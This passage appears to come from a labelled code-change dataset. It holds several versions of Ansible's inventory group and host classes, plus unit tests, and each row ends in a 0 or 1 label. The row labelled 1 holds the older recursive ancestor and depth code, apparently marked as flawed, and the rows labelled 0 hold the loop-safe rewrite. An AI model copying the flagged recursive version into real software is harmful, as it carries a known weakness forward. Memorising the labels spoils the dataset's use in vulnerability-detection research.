        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0
35,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1
36,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0
37,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
